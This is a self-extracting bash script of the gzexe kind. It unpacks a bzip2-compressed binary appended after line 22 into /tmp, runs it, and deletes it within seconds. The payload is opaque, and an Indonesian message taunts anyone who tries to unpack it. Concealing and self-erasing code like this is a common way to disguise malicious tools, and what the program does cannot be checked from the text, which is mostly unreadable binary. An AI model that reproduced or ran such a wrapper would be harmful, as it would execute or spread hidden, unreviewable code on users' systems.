#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYi���  ?_�DP|�
 @����0,ͰJ%2=�������	)OS�6��'Ꙡ�PQ� &���i��F�&CA�z�*F�W�>� ��1|�4�=Jl�yH���ܹ#8,��Z�����b#5�hL>^�V�
���$�ţ,�<8j��5�9�$�3�,��>.3R1F�zI;�I�p��ZLq����CR+Kܽ������ɏ�Y�J���a�ꘄy�82T�b���V`~0nPx�rc��!1D�`6YL$���dA��EϦ�^�!��ziq�ˌG�����T4+Ί��+ɞEܑN$f!a�